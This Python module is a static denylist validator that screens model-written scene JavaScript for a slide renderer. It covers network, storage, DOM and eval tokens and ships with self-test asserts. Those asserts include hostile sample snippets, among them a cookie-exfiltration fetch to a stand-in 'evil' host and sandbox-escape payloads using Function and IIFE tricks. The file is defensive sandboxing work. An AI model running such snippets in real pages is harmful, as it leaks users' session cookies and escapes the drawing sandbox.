"""Static safety gate for LLM-authored scene JS (the `visual` render style).

The visual renderer injects model-written JavaScript into the render page via
`new Function('s', code)` (see `deck.visual.scene`). That code is meant to touch
ONLY the scene-kit `s` (Rough.js drawing) plus `Math` and plain literals — never
the network, storage, DOM, timers, or any eval / global-escape. This module
STATICALLY scans that JS (it never executes it) and rejects anything outside the
allowed surface, so a hallucinated or malicious draw snippet can't phone home,
exfiltrate data, or break out of the drawing sandbox.

This validator is hand-written on purpose (NOT model-generated): the model that
writes the drawing code can't also weaken the rules that check it.

How it works: strip comments and string literals first — so a harmless label
like `s.text(0,0,'access the document',{})` isn't flagged for the word inside a
string — then match a denylist of dangerous identifiers/patterns on what remains.

  check(js)              -> list[str] of violations ([] == safe)
  sanitize_scenes(scenes) -> (scenes, warnings): blanks any offending base/step
                             in place (keeping the reveal group so voice-sync
                             stays intact) rather than failing the whole render.
"""
import re

# Cap: a legit per-element draw snippet is well under this; anything larger is
# pathological and rejected outright.
MAX_LEN = 8000

# Dangerous identifiers. The allowed surface is `s.*`, `Math.*`, control flow
# (for/let/const/if/else), operators, numbers and (stripped) string literals —
# NONE of which appear below. Anything here is a network/storage/DOM/eval/global
# escape and has no legitimate use in drawing code.
_WORDS = [
    # network / exfiltration
    "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker",
    "SharedWorker", "ServiceWorker", "sendBeacon", "navigator", "importScripts",
    "openDatabase",
    # persistent storage
    "localStorage", "sessionStorage", "indexedDB", "cookie", "caches",
    # eval / prototype / global escape
    "eval", "Function", "constructor", "import", "require", "process", "module",
    "exports", "Reflect", "Proxy", "atob", "btoa", "__proto__", "prototype",
    # global objects (any route to `window`/global == full capability)
    "window", "document", "globalThis", "self", "this",
    # DOM mutation (drawing goes through s.add(), never raw DOM)
    "createElement", "createElementNS", "innerHTML", "outerHTML",
    "insertAdjacentHTML", "setAttribute", "setAttributeNS", "appendChild",
    "insertBefore", "replaceChild",
    # deferred execution / control forms that must not appear in draw code
    "setTimeout", "setInterval", "setImmediate", "queueMicrotask",
    "requestAnimationFrame", "function", "return", "async", "await",
]
_FORBIDDEN = re.compile(r"\b(?:" + "|".join(_WORDS) + r")\b")

# Template literals run `${...}` as code, so their contents can't be safely
# stripped like a plain string — ban the backtick entirely (draw code needs none).
_BACKTICK = re.compile(r"`")
# Hex/unicode escapes outside strings are obfuscation (e.g. building "fetch").
_ESCAPE = re.compile(r"\\[xu]")

_COMMENT = re.compile(r"//[^\n]*|/\*.*?\*/", re.S)
_STRING = re.compile(r"'(?:\\.|[^'\\\n])*'|\"(?:\\.|[^\"\\\n])*\"")


def check(js):
    """List of safety violations in a JS snippet ([] means safe). Static only."""
    if not js:
        return []
    if len(js) > MAX_LEN:
        return [f"too long ({len(js)} chars > {MAX_LEN})"]
    code = _STRING.sub("''", _COMMENT.sub(" ", js))
    out = [f"forbidden token: {t}" for t in sorted(set(_FORBIDDEN.findall(code)))]
    if _BACKTICK.search(code):
        out.append("forbidden: template literal (backtick)")
    if _ESCAPE.search(code):
        out.append("forbidden: escape sequence (\\x / \\u)")
    return out


def sanitize_scenes(scenes):
    """Return (scenes, warnings). Any base/step whose draw code fails `check` is
    blanked IN PLACE — the reveal group (and its cue) is kept, so the timeline and
    voice-sync are unaffected; only the unsafe drawing is dropped."""
    warnings = []
    for i, sl in enumerate(scenes):
        vs = check(sl.get("base", ""))
        if vs:
            warnings += [f"slide {i + 1} base: {v}" for v in vs]
            sl["base"] = ""
        for j, st in enumerate(sl.get("steps", [])):
            vs = check(st.get("draw", ""))
            if vs:
                cue = st.get("cue", "")
                warnings += [f"slide {i + 1} step {j + 1} ({cue!r}): {v}" for v in vs]
                st["draw"] = ""
    return scenes, warnings


def _demo():
    # safe drawing code passes
    assert check("s.add(s.rc.circle(300,500,120,{stroke:s.color.yellow}));") == []
    assert check("for(let k=0;k<12;k++){s.add(s.rc.circle(200,760,70,{}));}") == []
    assert check("s.arrow(1,2,3,4,{color:s.color.salmon});s.text(0,0,'x',{size:40});") == []
    # dangerous words INSIDE a string literal are not flagged
    assert check("s.text(120,450,'access the document over the network',{});") == []
    # real threats are caught
    assert check("fetch('http://evil/'+document.cookie)")
    assert check("new Function('return this')()")
    assert check("s.add(s.rc.circle(1,1,1,{}));window.location='x';")
    assert check("eval('1+1')")
    assert check("(function(){return this})().XMLHttpRequest")  # IIFE escape
    assert any("template literal" in v for v in check("s.text(0,0,`${fetch('x')}`,{})"))
    # an obfuscated key inside a string is stripped; on `s` it can only reach s's
    # own props anyway, so it's harmless -> no violation
    assert check("s['\\x72\\x63'].circle(1,1,1,{})") == []
    assert check("var re=/\\x00/;s.add(s.rc.circle(1,1,1,{}))")  # \\x in raw code (regex) flagged
    # sanitize blanks the bad snippet but keeps the group/cue intact
    scenes = [{"narration": "n", "base": "window.x=1",
               "steps": [{"cue": "a", "draw": "fetch('x')"},
                         {"cue": "b", "draw": "s.add(s.rc.circle(1,1,1,{}));"}]}]
    clean, warns = sanitize_scenes(scenes)
    assert clean[0]["base"] == "" and clean[0]["steps"][0]["draw"] == ""
    assert clean[0]["steps"][1]["draw"] == "s.add(s.rc.circle(1,1,1,{}));"  # safe kept
    assert len(clean[0]["steps"]) == 2 and warns                            # group kept
    print("deck.visual.safety self-check ok")


if __name__ == "__main__":
    _demo()
